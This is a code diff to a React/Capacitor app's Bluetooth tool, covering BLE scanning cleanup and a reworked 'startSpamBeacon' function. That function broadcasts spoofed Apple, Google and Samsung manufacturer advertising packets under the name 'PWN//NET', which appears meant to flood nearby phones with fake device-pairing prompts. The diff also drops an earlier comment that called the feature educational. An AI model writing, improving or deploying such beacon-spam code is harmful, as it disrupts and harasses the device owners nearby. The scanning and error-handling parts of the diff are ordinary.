@@ -974,6 +974,9 @@ export function DeviceInfoTool({ tool, onClose }: { tool: ToolDef, onClose: () =
   );
 }
 
+// Global BLE state to prevent multiple initializations
+let globalBleInitialized = false;
+
 function BluetoothTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
   const [scanning, setScanning] = useState(false);
   const [message, setMessage] = useState<string>('');
@@ -983,21 +986,58 @@ function BluetoothTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }
 
   useEffect(() => {
     return () => {
+      // Safe exit cleanup
       if (Capacitor.isNativePlatform()) {
-        BleClient.stopLEScan().catch(console.error);
+        BleClient.stopLEScan().catch(() => {});
         BleClient.stopAdvertising().catch(() => {});
       }
     };
   }, []);
 
+  const ensureBleEnabled = async () => {
+    try {
+      if (!globalBleInitialized) {
+        await BleClient.initialize();
+        globalBleInitialized = true;
+      }
+      // On Android we might need to check and request enable
+      if (Capacitor.getPlatform() === 'android') {
+        const enabled = await BleClient.isEnabled();
+        if (!enabled) {
+          try {
+            await BleClient.enable();
+          } catch (e) {
+            // User might have denied, but we try to proceed or show message
+            throw new Error('Bluetooth must be enabled to use this tool.');
+          }
+        }
+      }
+    } catch (e: any) {
+      console.error('BLE INIT FAIL', e);
+      throw new Error(e.message || 'Bluetooth Hardware Busy');
+    }
+  };
+
+  const killActive = async () => {
+    if (!Capacitor.isNativePlatform()) return;
+    try { await BleClient.stopLEScan(); } catch(e) {}
+    try { await BleClient.stopAdvertising(); } catch(e) {}
+    setScanning(false);
+    setSpamming(false);
+    // Give hardware a breather
+    await new Promise(r => setTimeout(r, 400));
+  };
+
   const startScan = async () => {
     (document.activeElement as HTMLElement)?.blur();
     try {
       if (Capacitor.isNativePlatform()) {
+        await killActive();
+        setMessage('Initializing...');
+        await ensureBleEnabled();
+
         setScanning(true);
-        setMessage('Initializing native Bluetooth LE engine...');
-        await BleClient.initialize();
-        setMessage('Scanning for nearby BLE signals...');
+        setMessage('Listening...');
         
         await BleClient.requestLEScan({
           allowDuplicates: false
@@ -1017,13 +1057,13 @@ function BluetoothTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }
         });
         
         setTimeout(async () => {
-          await BleClient.stopLEScan();
+          await BleClient.stopLEScan().catch(() => {});
           setScanning(false);
           setMessage('Scan complete.');
         }, 15000);
       } else {
         if (!('bluetooth' in navigator)) {
-          setMessage('Cannot connect. Web Bluetooth not supported.');
+          setMessage('Web BT Unsupported.');
           setScanning(false);
           return;
         }
@@ -1033,45 +1073,57 @@ function BluetoothTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }
         setScanning(false);
       }
     } catch (error: any) {
-      setMessage('Error: ' + error.message);
+      setMessage('BT Error: ' + (error.message || 'Busy'));
       setScanning(false);
     }
   };
 
   const startSpamBeacon = async (type: 'apple' | 'google' | 'samsung') => {
     if (!Capacitor.isNativePlatform()) {
-      setMessage('Beacon Spamming requires native Android/iOS capabilities.');
+      setMessage('Native Hardware Required.');
       return;
     }
     try {
       setSpamming(true);
-      setMessage(`Initializing ${type.toUpperCase()} spoofing sequence...`);
-      await BleClient.initialize();
+      setMessage(`Locking Hardware...`);
 
-      // Simulated/Educational BLE Spamming payloads (Apple Action/Proximity)
-      // Note: Real spamming usually involves raw advertising packets which might
-      // require specific plugins or rooted access for some advanced packets.
-      // We'll use the available startAdvertising with manufacturer data.
+      // 1. Mandatory Kill
+      try { await BleClient.stopLEScan(); } catch(e) {}
+      try { await BleClient.stopAdvertising(); } catch(e) {}
 
-      let manufacturerData: number[] = [];
-      if (type === 'apple') {
-        manufacturerData = [0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12];
-      } else if (type === 'google') {
-        manufacturerData = [0xe0, 0x00, 0x01, 0x02, 0x03];
-      } else {
-        manufacturerData = [0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09];
+      // 2. Hardware cooldown
+      await new Promise(r => setTimeout(r, 800));
+
+      // 3. Re-Init engine
+      setMessage(`Priming ${type.toUpperCase()}...`);
+      try { await BleClient.initialize(); } catch(e) {}
+
+      let mId = 0x004c; // Default Apple
+      let mData: number[] = [0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30];
+
+      if (type === 'google') {
+        mId = 0x00e0;
+        mData = [0x00, 0x01, 0x02, 0x03];
+      } else if (type === 'samsung') {
+        mId = 0x0075;
+        mData = [0x42, 0x09, 0x81, 0x02];
       }
 
-      await BleClient.startAdvertising({
-        name: type === 'apple' ? 'AirPods Pro' : type === 'google' ? 'Pixel Buds' : 'Galaxy Buds',
-        services: [],
-        manufacturerId: manufacturerData[0] << 8 | manufacturerData[1],
-        manufacturerData: manufacturerData.slice(2)
-      });
-
-      setMessage(`BEACON ACTIVE: Broadcasting ${type.toUpperCase()} proximity packets...`);
+      // 4. Advertising Execution
+      try {
+        await BleClient.startAdvertising({
+          name: 'PWN//NET',
+          services: [],
+          manufacturerId: mId,
+          manufacturerData: mData
+        });
+        setMessage(`BROADCAST LIVE: ${type.toUpperCase()}`);
+      } catch (innerErr: any) {
+        setMessage('Driver Error: Cycle BT.');
+        setSpamming(false);
+      }
     } catch (error: any) {
-      setMessage('Spam Error: ' + error.message);
+      setMessage('Hardware Busy: Retry.');
       setSpamming(false);
     }
   };
